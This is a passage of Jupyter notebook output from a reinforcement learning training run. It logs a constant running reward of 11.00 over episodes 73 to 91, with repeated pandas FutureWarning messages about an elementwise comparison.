      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 73\t Frame count: 118100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 73\t Frame count: 118200\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 118300\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 118400\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 118500\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 118600\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 118700\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 118800\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 118900\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 119000\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 119100\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 119200\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 119300\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 119400\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 119500\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 119600\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 119700\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 119800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 73\t Frame count: 119900\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 120000\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 120100\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 120200\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 120300\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 120400\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 120500\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 120600\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 120700\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 120800\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 120900\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 121000\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 121100\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 121200\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 121300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 73\t Frame count: 121400\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 121500\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 121600\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 121700\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 121800\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 121900\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 122000\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 122100\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 122200\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 122300\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 122400\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 122500\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 122600\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 122700\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 122800\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 122900\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 123000\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 123100\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 123200\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 123300\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 123400\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 123500\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 123600\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 123700\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 123800\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 123900\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 124000\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 124100\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 124200\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 124300\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 124400\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 124500\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 124600\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 124700\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 124800\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 124900\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 125000\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 125100\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 125200\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 125300\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 125400\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 125500\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 125600\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 125700\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 125800\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 125900\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 126000\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 126100\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 126200\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 126300\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 126400\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 126500\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 126600\t Context: 2\n",
      "Running reward: 11.00\t Episode 74\t Frame count: 126700\t Context: 1\n",
      "Running reward: 11.00\t Episode 74\t Frame count: 126800\t Context: 2\n",
      "Running reward: 11.00\t Episode 74\t Frame count: 126900\t Context: 2\n",
      "Running reward: 11.00\t Episode 74\t Frame count: 127000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 74\t Frame count: 127100\t Context: 2\n",
      "Running reward: 11.00\t Episode 75\t Frame count: 127200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 76\t Frame count: 127300\t Context: 1\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 127400\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 127500\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 127600\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 127700\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 127800\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 127900\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 128000\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 128100\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 128200\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 128300\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 128400\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 128500\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 128600\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 128700\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 128800\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 128900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 76\t Frame count: 129000\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 129100\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 129200\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 129300\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 129400\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 129500\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 129600\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 129700\t Context: 2\n",
      "Running reward: 11.00\t Episode 76\t Frame count: 129800\t Context: 2\n",
      "Running reward: 11.00\t Episode 77\t Frame count: 129900\t Context: 1\n",
      "Running reward: 11.00\t Episode 77\t Frame count: 130000\t Context: 1\n",
      "Running reward: 11.00\t Episode 77\t Frame count: 130100\t Context: 1\n",
      "Running reward: 11.00\t Episode 77\t Frame count: 130200\t Context: 2\n",
      "Running reward: 11.00\t Episode 77\t Frame count: 130300\t Context: 2\n",
      "Running reward: 11.00\t Episode 77\t Frame count: 130400\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 77\t Frame count: 130500\t Context: 2\n",
      "Running reward: 11.00\t Episode 77\t Frame count: 130600\t Context: 2\n",
      "Running reward: 11.00\t Episode 77\t Frame count: 130700\t Context: 2\n",
      "Running reward: 11.00\t Episode 78\t Frame count: 130800\t Context: 1\n",
      "Running reward: 11.00\t Episode 78\t Frame count: 130900\t Context: 2\n",
      "Running reward: 11.00\t Episode 78\t Frame count: 131000\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 131100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 79\t Frame count: 131200\t Context: 1\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 131300\t Context: 1\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 131400\t Context: 1\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 131500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 79\t Frame count: 131600\t Context: 1\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 131700\t Context: 1\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 131800\t Context: 1\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 131900\t Context: 1\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 132000\t Context: 1\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 132100\t Context: 1\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 132200\t Context: 1\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 132300\t Context: 1\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 132400\t Context: 1\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 132500\t Context: 1\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 132600\t Context: 1\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 132700\t Context: 1\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 132800\t Context: 1\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 132900\t Context: 1\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 133000\t Context: 1\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 133100\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 133200\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 133300\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 133400\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 133500\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 133600\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 133700\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 133800\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 133900\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 134000\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 134100\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 134200\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 134300\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 134400\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 134500\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 134600\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 134700\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 134800\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 134900\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 135000\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 135100\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 135200\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 135300\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 135400\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 135500\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 135600\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 135700\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 135800\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 135900\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 136000\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 136100\t Context: 2\n",
      "Running reward: 11.00\t Episode 79\t Frame count: 136200\t Context: 2\n",
      "Running reward: 11.00\t Episode 80\t Frame count: 136300\t Context: 1\n",
      "Running reward: 11.00\t Episode 80\t Frame count: 136400\t Context: 2\n",
      "Running reward: 11.00\t Episode 80\t Frame count: 136500\t Context: 2\n",
      "Running reward: 11.00\t Episode 80\t Frame count: 136600\t Context: 2\n",
      "Running reward: 11.00\t Episode 81\t Frame count: 136700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 81\t Frame count: 136800\t Context: 2\n",
      "Running reward: 11.00\t Episode 81\t Frame count: 136900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 82\t Frame count: 137000\t Context: 1\n",
      "Running reward: 11.00\t Episode 82\t Frame count: 137100\t Context: 2\n",
      "Running reward: 11.00\t Episode 82\t Frame count: 137200\t Context: 2\n",
      "Running reward: 11.00\t Episode 82\t Frame count: 137300\t Context: 2\n",
      "Running reward: 11.00\t Episode 83\t Frame count: 137400\t Context: 1\n",
      "Running reward: 11.00\t Episode 83\t Frame count: 137500\t Context: 2\n",
      "Running reward: 11.00\t Episode 83\t Frame count: 137600\t Context: 2\n",
      "Running reward: 11.00\t Episode 83\t Frame count: 137700\t Context: 2\n",
      "Running reward: 11.00\t Episode 83\t Frame count: 137800\t Context: 2\n",
      "Running reward: 11.00\t Episode 83\t Frame count: 137900\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 138000\t Context: 1\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 138100\t Context: 1\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 138200\t Context: 1\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 138300\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 138400\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 138500\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 138600\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 138700\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 138800\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 138900\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 139000\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 139100\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 139200\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 139300\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 139400\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 139500\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 139600\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 139700\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 139800\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 139900\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 140000\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 140100\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 140200\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 140300\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 140400\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 140500\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 140600\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 140700\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 140800\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 140900\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 141000\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 141100\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 141200\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 141300\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 141400\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 141500\t Context: 2\n",
      "Running reward: 11.00\t Episode 84\t Frame count: 141600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 85\t Frame count: 141700\t Context: 1\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 141800\t Context: 1\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 141900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 85\t Frame count: 142000\t Context: 2\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 142100\t Context: 2\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 142200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 85\t Frame count: 142300\t Context: 2\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 142400\t Context: 2\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 142500\t Context: 2\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 142600\t Context: 2\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 142700\t Context: 2\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 142800\t Context: 2\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 142900\t Context: 2\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 143000\t Context: 2\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 143100\t Context: 2\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 143200\t Context: 2\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 143300\t Context: 2\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 143400\t Context: 2\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 143500\t Context: 2\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 143600\t Context: 2\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 143700\t Context: 2\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 143800\t Context: 2\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 143900\t Context: 2\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 144000\t Context: 2\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 144100\t Context: 2\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 144200\t Context: 2\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 144300\t Context: 2\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 144400\t Context: 2\n",
      "Running reward: 11.00\t Episode 85\t Frame count: 144500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 86\t Frame count: 144600\t Context: 1\n",
      "Running reward: 11.00\t Episode 86\t Frame count: 144700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 86\t Frame count: 144800\t Context: 2\n",
      "Running reward: 11.00\t Episode 86\t Frame count: 144900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 86\t Frame count: 145000\t Context: 2\n",
      "Running reward: 11.00\t Episode 86\t Frame count: 145100\t Context: 2\n",
      "Running reward: 11.00\t Episode 86\t Frame count: 145200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 87\t Frame count: 145300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 87\t Frame count: 145400\t Context: 1\n",
      "Running reward: 11.00\t Episode 87\t Frame count: 145500\t Context: 2\n",
      "Running reward: 11.00\t Episode 88\t Frame count: 145600\t Context: 2\n",
      "Running reward: 11.00\t Episode 88\t Frame count: 145700\t Context: 2\n",
      "Running reward: 11.00\t Episode 89\t Frame count: 145800\t Context: 2\n",
      "Running reward: 11.00\t Episode 90\t Frame count: 145900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 90\t Frame count: 146000\t Context: 2\n",
      "Running reward: 11.00\t Episode 91\t Frame count: 146100\t Context: 1\n",
      "Running reward: 11.00\t Episode 91\t Frame count: 146200\t Context: 1\n",
      "Running reward: 11.00\t Episode 91\t Frame count: 146300\t Context: 2\n",
